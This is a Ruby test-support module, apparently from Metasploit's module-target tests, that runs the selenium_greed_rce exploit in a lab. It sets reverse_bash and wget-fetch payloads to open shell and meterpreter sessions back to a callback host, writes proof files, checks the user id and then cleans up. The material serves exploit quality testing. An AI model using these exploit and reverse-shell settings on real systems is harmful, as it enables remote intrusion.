# frozen_string_literal: true

require_relative 'native'

# Actual owning payload sessions with independent native actor/file/process proof.
module SeleniumSessionTarget
  include SeleniumExecutionTarget

  def rc_command(label, role, *, required: true)
    super(label, role == 'linux' ? 'target' : role, *, required: required)
  end

  def sg_trace_start
    super
    code = "begin;rows=[];source=File.realpath('modules/exploits/linux/http/selenium_greed_rce.rb');trace=TracePoint.new(:return) do |event|;next unless event.method_id==:exploit_firefox && File.expand_path(event.path)==source;scope=event.binding;next unless scope.local_variable_defined?(:script);script=scope.local_variable_get(:script);next unless script.is_a?(String);rows<<{object_id:event.self.object_id,base64:Base64.strict_encode64(script.b),sha256:Digest::SHA256.hexdigest(script.b)};end;framework.instance_variable_set(:@module_target_selenium_scripts,rows);framework.instance_variable_set(:@module_target_selenium_script_trace,trace);trace.enable;{installed:true};end"
    expect(rc_json(code)).to eq('installed' => true)
  end

  def sg_trace_finish
    @rc[:owner_scripts] = rc_json('begin;trace=framework.instance_variable_get(:@module_target_selenium_script_trace);trace.disable if trace;framework.instance_variable_get(:@module_target_selenium_scripts);end')
    super
  end

  def sg_artifacts(action, *)
    script = File.read(File.expand_path('artifact_state.py', __dir__))
    output, = rc_command('downloads-' + action, 'target', 'python3', '-c', script, action, *)
    JSON.parse(output)
  end

  def sg_process(action, argument)
    script = File.read(File.expand_path('../pgpass_creds/process_state.py', __dir__))
    value = argument.is_a?(Hash) ? JSON.generate(argument) : argument.to_s
    output, = rc_command('process-' + action, 'target', 'python3', '-c', script, action, value)
    JSON.parse(output)
  end

  def sg_source_scripts
    rc_json('framework.instance_variable_get(:@module_target_selenium_scripts)')
  end

  def sg_session_support
    @rc[:session_runs] = []
    @rc[:observer] = rc_json('begin;load "test/module_targets/druid_sessions/session_control.rb";DruidSessionControl.install(framework);end')
    expect(@rc.fetch(:observer).fetch('installed')).to be(true)
    rc_callback
    code = "import json,shutil;print(json.dumps({name:shutil.which(name) for name in ['bash','wget','base64','python3']}))"
    output, = rc_command('payload-prerequisites', 'target', 'python3', '-c', code)
    tools = JSON.parse(output)
    expect(tools.values).to all(be_a(String).and(start_with('/')))
  end

  def sg_open_session(label, payload, target:, browser:, auto_check:, reuse: false)
    expect(rc_json('framework.sessions.keys')).to eq([])
    expect(sg_browser_state.fetch('sessions')).to eq([])
    @sg_run = { label: label, payload: payload, target: target, browser: browser, auto_check: auto_check, downloads_before: sg_artifacts('snapshot'), scripts_before: sg_source_scripts.length }
    @rc.fetch(:session_runs) << @sg_run
    rc_save
    callback = @rc.fetch(:callback)
    sockets = Array.new(2) { TCPServer.new(callback.fetch(:bind), 0) }
    ports = sockets.map { |socket| socket.local_address.ip_port }
    sockets.each(&:close)
    options = { 'TARGET' => target, 'PAYLOAD' => payload, 'BROWSER' => browser, 'HttpClientTimeout' => 30, 'LHOST' => callback.fetch(:host), 'LPORT' => ports.first, 'ReverseListenerBindAddress' => callback.fetch(:bind), 'DisablePayloadHandler' => false, 'AllowNoCleanup' => false, 'AutoCheck' => auto_check, 'WfsDelay' => 30 }
    if payload == 'cmd/unix/reverse_bash'
      options.merge!('BashPath' => '/bin/bash', 'ShellPath' => '/bin/sh', 'FD' => 120)
    elsif payload.start_with?('cmd/linux/http/')
      @sg_run[:fetch_path] = "/tmp/msfsel_#{Process.pid}_#{label}"
      options.merge!('FETCH_COMMAND' => 'WGET', 'FETCH_SRVHOST' => callback.fetch(:host), 'FETCH_SRVPORT' => ports.last, 'FetchListenerBindAddress' => callback.fetch(:bind), 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => File.basename(@sg_run.fetch(:fetch_path)), 'FETCH_DELETE' => true)
    end
    run_target_module(rc_owner, 'target', options, action: 'run -z', allow_errors: true, command_timeout: 180, reuse_module: reuse) do |output|
      @sg_run[:output_base64] = Base64.strict_encode64(output.b)
      @sg_run[:browser_after] = sg_browser_state
      @sg_run[:configuration_id] = rc_json('active_module.object_id')
      @sg_run[:scripts] = sg_source_scripts.drop(@sg_run.fetch(:scripts_before))
      rc_save
      expect(output).not_to include('Unknown datastore option', 'Exploit completed, but no session was created', 'Exploit failed:')
      expect(@sg_run.fetch(:browser_after).fetch('sessions')).to eq([])
    end
    expected_type = payload == 'cmd/unix/reverse_bash' ? 'shell' : 'meterpreter'
    @sg_run[:session] = rc_poll(40) do
      rows = rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,platform:session.platform,host:session.session_host}}')
      events = File.readlines(@rc.fetch(:observer).fetch('ready_event_path')).map { |line| JSON.parse(line) }
      rows.find { |row| row.fetch('type') == expected_type && events.any? { |event| event.fetch('id') == row.fetch('id') && event.fetch('type') == expected_type } }
    end
    identifier = @sg_run.fetch(:session).fetch('id')
    @sg_run[:proof_path] = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    if expected_type == 'shell'
      @sg_run[:proof] = rc_json("DruidSessionControl.proof(framework,#{identifier},#{@sg_run.fetch(:proof_path).inspect})")
      @sg_run[:proof_expected] = 'druid-session'
    else
      @sg_run[:channels_before] = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      code = "begin;session=framework.sessions.fetch(#{identifier});file=nil;begin;file=session.fs.file.new(#{@sg_run.fetch(:proof_path).inspect},'wb');file.write('selenium-session');ensure;file.close if file;end;{pid:session.sys.process.getpid,identity:session.sys.config.getuid,sysinfo:session.sys.config.sysinfo};end"
      @sg_run[:proof] = rc_json(code)
      @sg_run[:proof_expected] = 'selenium-session'
      @sg_run[:channels_after] = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      expect(@sg_run.fetch(:channels_after)).to eq(@sg_run.fetch(:channels_before))
    end
    expect(@sg_run.fetch(:proof)).not_to have_key('error')
    @sg_run[:identity] = sg_process('identity', @sg_run.fetch(:proof).fetch('pid'))
    expect(@sg_run.fetch(:identity).values_at('alive', 'uid')).to eq([true, 1200])
    output, = rc_command('session-proof-bytes', 'target', 'cat', @sg_run.fetch(:proof_path))
    expect(output).to eq(@sg_run.fetch(:proof_expected))
    uid, = rc_command('session-proof-uid', 'target', 'stat', '-c', '%u', @sg_run.fetch(:proof_path))
    expect(uid.strip).to eq('1200')
    rc_save
  end

  def sg_canary_artifact_start
    @sg_canary = { before: sg_artifacts('snapshot'), scripts_before: sg_source_scripts.length }
    @rc[:canary_artifacts] = @sg_canary
    rc_save
  end

  def sg_canary_artifact_cleanup
    return unless @sg_canary

    scripts = sg_source_scripts.drop(@sg_canary.fetch(:scripts_before))
    @sg_canary[:scripts] = scripts
    @sg_canary[:recovery] = sg_artifacts('recover', JSON.generate(@sg_canary.fetch(:before)), JSON.generate(scripts.map { |row| row.fetch('sha256') }))
    rc_save
  ensure
    @sg_canary = nil
  end

  def sg_session_cleanup
    return unless @sg_run

    run = @sg_run
    if run.key?(:session)
      identifier = run.fetch(:session).fetch('id')
      run[:shutdown] = rc_json("DruidSessionControl.exit_remote(framework,#{identifier})")
      run[:process_recovery] = sg_process('stop', run.fetch(:identity)) if run.key?(:identity)
      console_command("sessions -k #{identifier}") if rc_json('framework.sessions.keys').include?(identifier)
      rc_poll { !rc_json('framework.sessions.keys').include?(identifier) }
    end
    console_command('jobs -K')
    if run.key?(:proof_path)
      code = "from pathlib import Path;import json,sys;p=Path(sys.argv[1]);assert p.parent==Path('/tmp') and p.name.startswith('module-target-druid-session-');assert p.stat().st_uid==1200 and p.read_text()==sys.argv[2];p.unlink();print(json.dumps({'absent':not p.exists()}))"
      output, = rc_command('remove-session-proof', 'target', 'python3', '-c', code, run.fetch(:proof_path), run.fetch(:proof_expected))
      run[:marker_recovery] = JSON.parse(output)
    end
    scripts = run.fetch(:scripts, [])
    run[:download_recovery] = sg_artifacts('recover', JSON.generate(run.fetch(:downloads_before)), JSON.generate(scripts.map { |row| row.fetch('sha256') }))
    if run.key?(:fetch_path)
      _, status = rc_command('fetch-file-absent', 'target', 'test', '!', '-e', run.fetch(:fetch_path), required: false)
      run[:fetch_file_absent] = status.zero?
      expect(run.fetch(:fetch_file_absent)).to be(true)
    end
    expect(run.fetch(:process_recovery).fetch('operator_signals')).to eq([]) if run.key?(:process_recovery)
    run[:framework_after] = rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')
    expect(run.fetch(:framework_after)).to eq('sessions' => [], 'jobs' => [])
    expect(sg_browser_state.fetch('sessions')).to eq([])
    rc_save
  ensure
    @sg_run = nil
    rc_save
  end
end
